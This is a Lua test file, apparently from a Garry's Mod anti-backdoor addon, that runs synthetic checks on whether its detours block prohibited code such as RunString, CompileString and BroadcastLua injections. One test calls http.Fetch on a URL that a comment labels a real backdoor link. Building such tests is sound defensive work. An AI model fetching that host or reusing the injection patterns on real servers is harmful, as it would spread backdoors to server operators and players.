--[[
    2020-2021 Xalalau Xubilozo. MIT License
    https://xalalau.com/
--]]

-- Run synthetic tests to easyly check if code changes are working
function BS:Debug_RunTests(args)
    local tests = {}
    tests.aux = {}

    tests.text = {
        ["detour"] = "Detour a function and call it",
        ["detour2"] = "Detour a function without calling it",
        ["getfenv"] = "Try to get our custom environment",
        ["tostring"] = "Try to check if a detoured function is valid",
        ["debug.getfenv"] = "Try to get our custom environment",
        ["http.Fetch"] = "Run a prohibited code combination",
        ["RunString"] = "Run a prohibited code combination",
        ["RunString2"] = "Run a prohibited code combination with fake function names",
        ["RunStringEx"] = "Run a prohibited code combination",
        ["debug.getinfo"] = "Try to check if a detoured function is valid",
        ["jit.util.funcinfo"] = "Try to check if a detoured function is valid",
        ["CompileFile"] = "Run a prohibited code combination",
        ["CompileString"] = "Run a prohibited code combination",
        ["PersistentTrace"] = "Run a prohibited code combination with fake function names inside two timers",
    }
    
    function tests.help()
        MsgC(self.colors.header, "\n  Available tests:\n\n")
        for k,v in SortedPairs(tests.text) do
            local colorParts = string.Explode("::", string.format("     %-18s:: %s", k, v))
            MsgC(self.colors.key, colorParts[1], self.colors.value, colorParts[2] .. "\n")
        end
        MsgC(self.colors.message, "\n  Usage: bs_tests test1 test2 test3 ...\n\n  Leave empty to run all tests.\n\n")
    end

    function tests.detour()
        local bak = self.__G["timer"]["Simple"]
        MsgC(self.colors.header, "\n-----> Detour: " .. tests.text["detour"] .. "\n")
        local function detour()
            bak(0, function() end)
        end
        self.__G["timer"]["Simple"] = detour
        detour()
        if self.__G["timer"]["Simple"] ~= detour then
            MsgC(self.colors.message, " (Pass) Detour undone.\n")
        else
            MsgC(self.colors.message, " (Fail) The detour still exists!\n")
            self.__G["timer"]["Simple"] = bak
        end
        print()
    end

    function tests.detour2()
        MsgC(self.colors.header, "\n-----> Detour2: " .. tests.text["detour2"] .. "\n")
        local function detourSilent() end
        self.__G["http"]["Post"] = detourSilent
        MsgC(self.colors.message, "\n (Wainting) Detouring auto check test result pending... After some seconds: Pass = block execution; Fail = no alerts.\n\n")
    end

    function tests.getfenv()
        MsgC(self.colors.header, "\n-----> getfenv: " .. tests.text["getfenv"] .. "\n")
        local env = self.__G.getfenv()
        if env == self.__G then
            MsgC(self.colors.message, " (Pass) Our custom environment is out of range.\n")
        else
            MsgC(self.colors.message, " (Fail) Our custom environment is exposed!\n")
        end
        print()
    end

    function tests.tostring()
        MsgC(self.colors.header, "\n-----> tostring: " .. tests.text["tostring"] .. "\n\n")

        if string.find(self.__G.tostring(self.__G["jit"]["util"]["funcinfo"]), "builtin") then
            MsgC(self.colors.message, " (Pass) A selected detour (jit.util.funcinfo) is invisible.\n")
        else
            MsgC(self.colors.message, " (Fail) A selected detour (jit.util.funcinfo) is visible!\n")
        end
        print()
    end

    function tests.aux.debuggetfenv()
        MsgC(self.colors.header, "\n-----> debug.getfenv: " .. tests.text["debug.getfenv"] .. "\n")
        local function this() end
        local env = self.__G.debug.getfenv(this)
        if env == self.__G then
            MsgC(self.colors.message, " (Pass) Our custom environment is out of range.\n")
        else
            MsgC(self.colors.message, " (Fail) Our custom environment is exposed!\n")
        end
        print()
    end
    tests["debug.getfenv"] = tests.aux.debuggetfenv

    function tests.aux.httpFetch()
        MsgC(self.colors.header, "\n-----> http.Fetch: " .. tests.text["http.Fetch"] .. "\n")
        self.__G.http.Fetch("http://disp0.cf/gas.lua", function (arg) -- Real backdoor link
            MsgC(self.colors.message, "\nProhibited code is running inside http.Fetch!\n")
        end)
        MsgC(self.colors.message, "\n (Waiting) http.Fetch test result pending... Pass = block execution; Fail = run and print message.\n\n")
    end
    tests["http.Fetch"] = tests.aux.httpFetch

    function tests.RunString()
        MsgC(self.colors.header, "\n-----> RunString: " .. tests.text["RunString"] .. "\n")
        self.__G.RunString([[ BroadcastLua("print('')") print("\nProhibited code is running!")]]);
        MsgC(self.colors.message, "\n (Result) Pass = block execution; Fail = Print a message.\n\n")
    end

    function tests.RunString2()
        MsgC(self.colors.header, "\n-----> RunString2: " .. tests.text["RunString2"] .. "\n")
        self.__G.CompStrBypass = self.__G.CompileString
        self.__G.RunString([[ print("\n1") local two = CompStrBypass("print(2)") if isfunction(two) then two() end print("\n3")]]);
        self.__G.CompStrBypass = nil
        MsgC(self.colors.message, "\n (Result) Pass = 1 and 3 are visible but 2 is blocked; Fail = 1, 2 and 3 are visible.\n\n")
    end

    function tests.RunStringEx()
        MsgC(self.colors.header, "\n-----> RunStringEx: " .. tests.text["RunStringEx"] .. "\n")
        self.__G.RunStringEx([[RunString(print("Prohibited code is running!"))]]);
        MsgC(self.colors.message, "\n (Result) Pass = block execution; Fail = Print a message.\n\n")
    end

    function tests.aux.debuggetinfo()
        MsgC(self.colors.header, "\n-----> debug.getinfo: " .. tests.text["debug.getinfo"] .. "\n" .. "\n")
        PrintTable(self.__G.debug.getinfo(self.__G.RunString, "flnSu"))
        print()
        if self.__G.debug.getinfo(self.__G.RunString).short_src == "[C]" then
            MsgC(self.colors.message, " (Pass) A selected detour (RunString) is invisible.\n")
        else
            MsgC(self.colors.message, " (Fail) A selected detour (RunString) is visible!\n")
        end
        print()
    end
    tests["debug.getinfo"] = tests.aux.debuggetinfo

    function tests.aux.jitutilfuncinfo()
        MsgC(self.colors.header, "\n-----> jit.util.funcinfo: " .. tests.text["jit.util.funcinfo"] .. "\n\n")
        PrintTable(self.__G.jit.util.funcinfo(self.__G.debug.getinfo))
        print()
        if self.__G.jit.util.funcinfo(self.__G.debug.getinfo)["source"] == nil then
            MsgC(self.colors.message, " (Pass) A selected detour (debug.getinfo) is invisible.\n")
        else
            MsgC(self.colors.message, " (Fail) A selected detour (debug.getinfo) is visible!\n")
        end
        print()
    end
    tests["jit.util.funcinfo"] = tests.aux.jitutilfuncinfo

    function tests.CompileFile()
        MsgC(self.colors.header, "\n-----> CompileFile: " .. tests.text["CompileFile"] .. "\n")
        local compFile = self.__G.CompileFile("bs/server/modules/debug.lua")
        print()
        if not compFile then
            MsgC(self.colors.message, " (Pass) A file full of prohibited code combinations wasn't compiled.\n")
        else
            MsgC(self.colors.message, " (Fail) A file full of prohibited code combinations was compiled!\n")
        end
        print()
    end

    function tests.CompileString()
        MsgC(self.colors.header, "\n-----> CompileString: " .. tests.text["CompileString"] .. "\n")
        local compStr = self.__G.CompileString("RunString(MsgN('Hi))", "TestCode")
        print()
        if compStr == "" then
            MsgC(self.colors.message, " (Pass) A string with prohibited code combinations wasn't compiled.\n")
        else
            MsgC(self.colors.message, " (Fail) A string with prohibited code combinations was compiled!\n")
        end
        print()
    end

    function tests.PersistentTrace()
        MsgC(self.colors.header, "\n-----> PersistentTrace: " .. tests.text["PersistentTrace"] .. "\n")
        self.__G.CompStr = self.__G.CompileString
        self.__G.code = [[ return "2" ]]
        self.__G.timer.Simple(0, function()
            self.__G.timer.Simple(0, function()
                self.__G.RunString([[
                    --print("1")
                    print(CompStr(code))
                    --print("3")
                ]])
            end)
        end)
        MsgC(self.colors.message, "\n (Waiting) Persistent trace result pending... Pass = Trace with one \"(+) BS - Persistent Trace\"; Fail = Any other trace.\n\n")
    end

    if #args == 0 or args[1] ~= "help" then
        MsgC(self.colors.header, "\n\n---------------------------------------------------------\n")
        MsgC(self.colors.header, "[STARTING TESTS]\n\n")
    end

    local isRunningAll = #args == 0 and true 
    local printDelayedMsg = {}

    if isRunningAll then
        for k,v in pairs(tests) do
            if v and isfunction(v) and v ~= tests.help then
                v()
            end
        end
    else
        local found
        for _,testName in ipairs(args) do
            if tests[testName] then
                if testName == "http.Fetch" or
                   testName == "detour2" or
                   testName == "PersistentTrace" then

                    printDelayedMsg[testName] = true
                end
                found = true
                tests[testName]()
            end
        end
        if not found then
            MsgC(self.colors.message, "\nTest \"" .. args[1] .. "\" not found...\n\n")
            tests.help()
        end
    end

    if isRunningAll or args[1] ~= "help" then
        MsgC(self.colors.header, "\n[FINISHING TESTS]\n")
        MsgC(self.colors.header, "---------------------------------------------------------\n")
        if table.Count(printDelayedMsg) > 0 then
            MsgC(self.colors.header, "[WAITING FOR]\n\n")
        end

        if isRunningAll or printDelayedMsg["http.Fetch"] then
            MsgC(self.colors.header, "--> http.Fetch test result...\n")
        end
        if isRunningAll or printDelayedMsg["detour2"] then
            MsgC(self.colors.header, "--> Detouring auto check test result...\n")
        end
        if isRunningAll or printDelayedMsg["PersistentTrace"] then
            MsgC(self.colors.header, "--> Persistent check test result...\n")
        end
    end
end
